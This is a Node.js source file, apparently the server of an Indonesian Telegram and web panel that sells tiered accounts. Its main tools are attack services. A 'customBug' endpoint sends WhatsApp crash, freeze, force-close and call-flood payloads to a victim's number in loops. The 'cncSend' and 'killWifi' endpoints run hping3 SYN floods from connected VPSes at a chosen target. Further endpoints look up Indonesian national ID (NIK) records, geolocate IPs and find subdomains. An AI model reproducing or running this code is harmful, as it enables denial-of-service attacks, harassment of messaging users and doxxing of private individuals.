      if(data==='inaf_dev_deposits'){const rows=cfg.deposits.filter(x=>x.status==='pending_review').slice(-10).reverse();const t=rows.length?rows.map(x=>`${x.id} | Rp${Number(x.amount).toLocaleString('id-ID')} | ${x.sellerName}`).join('\n'):'Tidak ada setoran menunggu.';return bot.sendMessage(id,`💰 SETORAN MENUNGGU\n${t}`);}
    }
    const approve=data.match(/^inaf_(approve|reject)_(tx|dep)_(.+)$/);
    if(approve){
      if(!inafIsDeveloper(id)) return bot.answerCallbackQuery(q.id,{text:'Hanya Developer yang dapat memproses.'});
      const [,action,kind,itemId]=approve; const arr=kind==='tx'?cfg.transactions:cfg.deposits; const item=arr.find(x=>x.id===itemId);
      if(!item||item.status!=='pending_review') return bot.answerCallbackQuery(q.id,{text:'Data tidak ditemukan atau sudah diproses.'});
      if(action==='reject'){item.status='rejected';item.reviewedBy=id;item.updatedAt=new Date().toISOString();inafSave(cfg);const target=kind==='tx'?item.buyerId:item.sellerId;await bot.sendMessage(target,`❌ ${kind==='tx'?'Transaksi':'Setoran'} ${item.id} ditolak Developer.`);await bot.answerCallbackQuery(q.id,{text:'Ditolak.'});return bot.editMessageCaption((q.message.caption||'')+'\n\n❌ DITOLAK',{chat_id:q.message.chat.id,message_id:q.message.message_id}).catch(()=>{});}
      if(kind==='dep'){cfg.balances[item.sellerId]=Number(cfg.balances[item.sellerId]||0)+Number(item.amount);item.status='approved';item.reviewedBy=id;item.updatedAt=new Date().toISOString();inafSave(cfg);await bot.sendMessage(item.sellerId,`✅ Setoran ${item.id} disetujui. Saldo bertambah Rp${Number(item.amount).toLocaleString('id-ID')}.`);await bot.answerCallbackQuery(q.id,{text:'Setoran disetujui.'});return bot.editMessageCaption((q.message.caption||'')+'\n\n✅ DISETUJUI',{chat_id:q.message.chat.id,message_id:q.message.message_id}).catch(()=>{});}
      const db=loadDatabase(); if(db.some(u=>String(u.username).toLowerCase()===String(item.accountUsername).toLowerCase())) return bot.answerCallbackQuery(q.id,{text:'Username sudah digunakan; transaksi perlu diperiksa.'});
      const expired=new Date();expired.setDate(expired.getDate()+30);
      db.push({username:item.accountUsername,password:item.accountPassword,role:item.role,expiredDate:expired.toISOString().slice(0,10),telegramId:item.buyerId,telegramUsername:item.buyerName,createdBy:'INAF PROJECT',createdAt:new Date().toISOString()});saveDatabase(db);
      item.status='approved';item.reviewedBy=id;item.updatedAt=new Date().toISOString();
      if(item.sellerId){const rate=Number(cfg.sellerRates[item.sellerId] ?? cfg.commissionPercent ?? 10);if(rate>0)cfg.balances[item.sellerId]=Number(cfg.balances[item.sellerId]||0)+Math.floor(item.amount*rate/100);}
      inafSave(cfg);
      const link=cfg.groupLinks[inafRole(item.role)];let reply=`✅ Pembelian disetujui!\nUsername: ${item.accountUsername}\nPassword: ${item.accountPassword}\nRole: ${item.role}\nMasa aktif: 30 hari`;
      if(link)reply+=`\n\n🔗 Link grup role kamu: ${link}`;else reply+='\n\nLink grup belum diatur. Hubungi Developer.';
      await bot.sendMessage(item.buyerId,reply);await bot.answerCallbackQuery(q.id,{text:'Transaksi disetujui; akun dibuat.'});return bot.editMessageCaption((q.message.caption||'')+'\n\n✅ DISETUJUI',{chat_id:q.message.chat.id,message_id:q.message.message_id}).catch(()=>{});
    }
  } catch(err){console.error('[INAF callback]',err);try{await bot.answerCallbackQuery(q.id,{text:'Terjadi kesalahan. Periksa log bot.'});}catch(_){}}
});
// ================= END INAF PROJECT ADD-ON =================

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://cp.zyrostore.id:3594:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *AXRRG-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* ${session}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    list.sort((a, b) => b.total - a.total);

    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH_CLEAR = path.join(__dirname, "permenmd");

bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH_CLEAR)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    fs.rmSync(SESSION_PATH_CLEAR, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH_CLEAR, { recursive: true });

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH_CLEAR)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH_CLEAR);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH_CLEAR, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
  }, 8000);

  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

const RESTART_INTERVAL = 20 * 60 * 1000;

setInterval(() => {
  try {
    kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  } catch(e) {}
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0);
  }, 5000);
}, RESTART_INTERVAL);

app.post('/api/auth/validate', (req, res) => { req.url = '/validate'; app.handle(req, res); });
app.get('/api/auth/myInfo', (req, res) => { req.url = '/myInfo'; app.handle(req, res); });

app.post('/api/user/changepass', (req, res) => { req.url = '/changepass'; app.handle(req, res); });
app.get('/api/user/createAccount', (req, res) => { req.url = '/createAccount?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/deleteUser', (req, res) => { req.url = '/deleteUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/listUsers', (req, res) => { req.url = '/listUsers?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/userAdd', (req, res) => { req.url = '/userAdd?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/editUser', (req, res) => { req.url = '/editUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/getActivityLogs', (req, res) => { req.url = '/getLog?' + (req.url.split('?')[1]||''); app.handle(req, res); });

app.get('/api/device/getPerms', (req, res) => { req.url = '/devicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm', (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', (req, res) => { req.url = '/listDevicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/whatsapp/getPublicSenders', (req, res) => { req.url = '/getPublicSenders?' + (req.url.split('?')[1]||''); app.handle(req, res); });

app.get('/api/whatsapp/sendBug', (req, res) => { req.url = '/sendBug?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/whatsapp/mySender', (req, res) => { req.url = '/mySender?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/whatsapp/getPairing', (req, res) => { req.url = '/getPairing?' + (req.url.split('?')[1]||''); app.handle(req, res); });

app.get('/api/whatsapp/customBug', async (req, res) => {
  const { key, target: rawTarget, bug, qty, delay, senderType } = req.query;
  let target = (rawTarget || '').replace(/\D/g, '');
  console.log(`[📤 CUSTOM BUG] target=${target} bug=${bug} qty=${qty} delay=${delay}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: 'User not found' });

  const roleCooldowns = { developer: 0, founder: 0, owner: 0, tk: 60, reseller: 240, vip: 60, member: 300 };
  const role = user.role || 'member';
  const cooldownSeconds = roleCooldowns[role] || 60;
  const now = Date.now();
  const diffSeconds = Math.floor((now - (user.lastSend || 0)) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({ valid: true, sended: false, cooldown: true, wait: cooldownSeconds - diffSeconds });
  }

  user.lastSend = now;
  saveDatabase(db);
  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    const sock = await checkActiveSessionInFolder(keyInfo.username);
    if (!sock) return;
    const targetJid = target + '@s.whatsapp.net';
    const sendQty = parseInt(qty) || 1;
    const sendDelay = parseInt(delay) || 1000;
    const bugList = bug ? bug.split(',').map(b => b.trim()) : [];
    for (let i = 0; i < sendQty; i++) {
      for (const b of bugList) {
        try {
          switch (b) {
            case 'crash_spam': 
              await BlankNew(sock, targetJid);
              await system(sock, targetJid);
              await kontol(sock, targetJid);
              break;
            case 'hard': 
              await DelayInvisible(sock, targetJid);
              await DelayXBlank(sock, targetJid);
              await system(sock, targetJid);
              await kontol(sock, targetJid);
              await XcvBebasSpam(sock, targetJid);
              break;
            case 'click': 
              await BlankClick(sock, targetJid); 
              await BlankNew(sock, targetJid);
              break;
            case 'android': 
              await Crshlogdelay(sock, targetJid); 
              await BlankClick(sock, targetJid);
              break;
            case 'fc_invis':
              await ForceInvis(sock, targetJid);
              break;
            case 'fc': 
              await Frezee(sock, targetJid); 
              await fc(sock, targetJid); 
              await fcperma(sock, targetJid); 
              await ran(sock, targetJid); 
              await Forceclose(sock, targetJid);
              break;
            case 'blanknew': 
              await Blclck(sock, targetJid); 
              break;
            case 'ban_group':
              await nukeGB(sock, targetJid);
              break;
            case 'delay': 
              await DelayInvisible(sock, targetJid); 
              break;
            case 'delayxblank': 
              await DelayXBlank(sock, targetJid);
              await DelayInvisible(sock, targetJid);
              break;
            case 'gacor_full':
              await Promise.allSettled([
                RulzxNieh(sock, targetJid),
                safeDelay(sock, targetJid),
              ]);
              break;
            case 'matrix':
              await Promise.allSettled([
                DelayInvisible(sock, targetJid), 
                DelayXBlank(sock, targetJid), 
                Forceclose(sock, targetJid), 
                BlankNew(sock, targetJid), 
                Crshlogdelay(sock, targetJid), 
                BlankClick(sock, targetJid), 
                Frezee(sock, targetJid), 
              ]);
              break;
            case 'call_flood':
              await kontol(sock, targetJid);
              await system(sock, targetJid);
              break;
            case 'bug_group':
              await spamnotif(sock, targetJid);
              await bugGroup(sock, targetJid);
              break;
            case 'crashXdelay':
              await Crshlogdelay(sock, targetJid);
              break;
            default: 
              await system(sock, targetJid); 
              break;
          }
        } catch (e) { console.warn('[⚠️ CUSTOM BUG]', e.message); }
      }
      if (i < sendQty - 1) await new Promise(r => setTimeout(r, sendDelay));
    }
  });
});

app.get('/api/whatsapp/groupBug', (req, res) => { req.url = '/raidGroup?' + (req.url.split('?')[1]||''); app.handle(req, res); });

app.get('/api/vps/myServer', (req, res) => { req.url = '/myServer?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/vps/addServer', (req, res) => { req.url = '/addServer'; app.handle(req, res); });
app.post('/api/vps/delServer', (req, res) => { req.url = '/delServer'; app.handle(req, res); });
app.post('/api/vps/sendCommand', (req, res) => { req.url = '/sendCommand'; app.handle(req, res); });

app.get('/api/vps/cncSend', (req, res) => {
  const { key, target, ddos, port, duration } = req.query;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: 'Invalid session key' });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (!userVPS.length) return res.status(400).json({ error: 'No VPS available' });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) continue;
    const cmd = `screen -dmS cnc_${Date.now()} hping3 -S --flood ${target} -p ${port || 80}`;
    const kill = `sleep ${duration || 60}; pkill screen`;
    conn.exec(`${cmd} && ${kill}`, (err, stream) => {
      if (err) console.error('❌ cncSend exec error:', err.message);
    });
  }
  res.json({ success: true, message: `CNC sent to ${userVPS.length} VPS` });
});

app.get('/killWifi', (req, res) => {
  const { key, target, duration } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  const owner = getUserByKey(key);
  if (!owner) return res.json({ valid: false });
  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (!userVPS.length) return res.json({ valid: false, message: 'No VPS available' });
  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) continue;
    const cmd = `screen -dmS wifi_${Date.now()} hping3 -S --flood ${target} -p 80`;
    const kill = `sleep ${duration || 120}; pkill screen`;
    conn.exec(`${cmd} && ${kill}`, (err) => {
      if (err) console.error('killWifi exec error:', err.message);
    });
  }
  res.json({ valid: true, success: true, message: `Attack sent via ${userVPS.length} VPS` });
});

app.get('/api/extra/prayer-times', async (req, res) => {
  const { latitude, longitude } = req.query;
  if (!latitude || !longitude) return res.json({ success: false, error: 'Missing latitude/longitude' });
  try {
    const r = await axios.get(`http://api.aladhan.com/v1/timings?latitude=${latitude}&longitude=${longitude}&method=11`);
    const t = r.data.data.timings;
    return res.json({
      success: true,
      valid: true,
      data: {
        fajr:    t.Fajr,
        sunrise: t.Sunrise,
        dhuhr:   t.Dhuhr,
        asr:     t.Asr,
        maghrib: t.Maghrib,
        isha:    t.Isha
      }
    });
  } catch (e) {
    return res.json({ success: false, valid: false, error: e.message });
  }
});

app.get('/api/extra/prayer-times/next', async (req, res) => {
  const { latitude, longitude } = req.query;
  if (!latitude || !longitude) return res.json({ success: false, error: 'Missing latitude/longitude' });
  try {
    const r = await axios.get(`http://api.aladhan.com/v1/timings?latitude=${latitude}&longitude=${longitude}&method=11`);
    const timings = r.data.data.timings;
    const now = new Date();
    const nowStr = now.toTimeString().slice(0, 5);
    const prayerOrder = ['Fajr','Dhuhr','Asr','Maghrib','Isha'];
    let nextPrayer = 'Fajr';
    let nextTime = timings['Fajr'];
    for (const p of prayerOrder) {
      if (timings[p] > nowStr) {
        nextPrayer = p;
        nextTime = timings[p];
        break;
      }
    }
    const currentTime = nowStr;
    return res.json({
      success: true,
      valid: true,
      data: {
        nextPrayer,
        time: nextTime,
        currentTime
      }
    });
  } catch (e) {
    return res.json({ success: false, valid: false, error: e.message });
  }
});

app.get('/api/extra/developers', (req, res) => {
  return res.json({
    valid: true,
    success: true,
    developers: [
      {
        name: 'ZAXX',
        role: 'Lead Developer',
        description: 'Backend & Mobile Developer',
        telegram: '@zaxx_str',
        avatar: 'https://ziperr-img.lovable.app/i/wvurlkeo.jpg',
        color: '#B0BEC5'
      }
    ]
  });
});

app.get('/api/extra/developer/main', (req, res) => {
  return res.json({
    valid: true,
    success: true,
    creator: { name: 'zaxx', role: 'Lead Developer', email: 'zaxx@admin.com', telegram: '@andipmx', website: 'http://zaxx-private-serper-cloud.pteroq.biz.id:2000', avatar: 'https://ziperr-img.lovable.app/i/wvurlkeo.jpg' }
  });
});

app.get('/api/tools/nik-check', async (req, res) => {
  const { key, nik } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ status: false, message: 'Invalid key' });
  try {
    const r = await axios.get(`https://api.siputzx.my.id/api/tools/kependudukan?nik=${nik}`);
    const raw = r.data;
    const nikData = raw.data || raw;
    return res.json({
      status: true,
      valid: true,
      data: {
        data: {
          nik:          nikData.nik || nik,
          nama:         nikData.nama || nikData.name || 'N/A',
          kelamin:      nikData.kelamin || nikData.jenis_kelamin || 'N/A',
          tempat_lahir: nikData.tempat_lahir || nikData.birthplace || 'N/A',
          usia:         nikData.usia || nikData.age || 'N/A',
          provinsi:     nikData.provinsi || nikData.province || 'N/A',
          kabupaten:    nikData.kabupaten || nikData.city || 'N/A',
          kecamatan:    nikData.kecamatan || nikData.district || 'N/A',
          kelurahan:    nikData.kelurahan || nikData.village || 'N/A',
        },
        metadata: {
          source: 'siputzx',
          timestamp: new Date().toISOString()
        }
      }
    });
  } catch (e) {
    return res.json({ status: false, valid: false, error: e.message });
  }
});

app.get('/api/tools/subdomain-finder', async (req, res) => {
  const { key, domain } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ status: false, message: 'Invalid key' });
  try {
    const r = await axios.get(`https://api.siputzx.my.id/api/tools/subdomains?domain=${domain}`);
    const raw = r.data;
    let subList = [];
    if (raw.data && Array.isArray(raw.data)) subList = raw.data;
    else if (Array.isArray(raw)) subList = raw;
    return res.json({ status: true, valid: true, data: subList });
  } catch (e) {
    return res.json({ status: false, valid: false, error: e.message });
  }
});

const chatSessionsData = {};

app.get('/api/tools/chat/list', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const username = keyInfo.username;
  const chatHistoryList = Object.keys(chatSessionsData)
    .filter(id => chatSessionsData[id].username === username)
    .map(id => {
      const sess = chatSessionsData[id];
      return {
        sessionId: id,
        username: sess.username,
        lastModified: sess.lastModified || new Date().toISOString(),
        messageCount: (sess.messages || []).length,
        preview: sess.preview || 'No messages yet'
      };
    })
    .sort((a, b) => new Date(b.lastModified) - new Date(a.lastModified));
  return res.json({ valid: true, chatHistoryList });
});

app.get('/api/tools/chat/new-session', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const sessionId = keyInfo.username + '_' + Date.now();
  chatSessionsData[sessionId] = {
    username: keyInfo.username,
    messages: [],
    lastModified: new Date().toISOString(),
    preview: 'New conversation'
  };
  return res.json({ valid: true, sessionId });
});

app.get('/api/tools/chat/history', (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const sess = chatSessionsData[session];
  if (!sess || sess.username !== keyInfo.username) return res.json({ valid: false, chatHistory: [] });
  return res.json({ valid: true, chatHistory: sess.messages || [] });
});

app.get('/api/tools/chat/delete', (req, res) => {
  const { key, session } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  delete chatSessionsData[session];
  return res.json({ valid: true });
});

app.get('/api/tools/chat/send', async (req, res) => {
  const { key, session, message } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ status: false, message: 'Invalid key' });
  if (!chatSessionsData[session]) {
    chatSessionsData[session] = { username: keyInfo.username, messages: [], lastModified: new Date().toISOString(), preview: '' };
  }
  const sess = chatSessionsData[session];
  const userMsg = { message: decodeURIComponent(message || ''), isAI: false, timestamp: new Date().toISOString() };
  sess.messages.push(userMsg);
  sess.preview = userMsg.message.slice(0, 50);
  sess.lastModified = new Date().toISOString();

  const reply = `Maaf, fitur AI Chat belum terhubung ke model. Pesan kamu: "${userMsg.message}"`;
  const aiMsg = { message: reply, isAI: true, timestamp: new Date().toISOString() };
  sess.messages.push(aiMsg);

  return res.json({ status: true, valid: true, data: { message: reply } });
});

const telegramSessions = {};

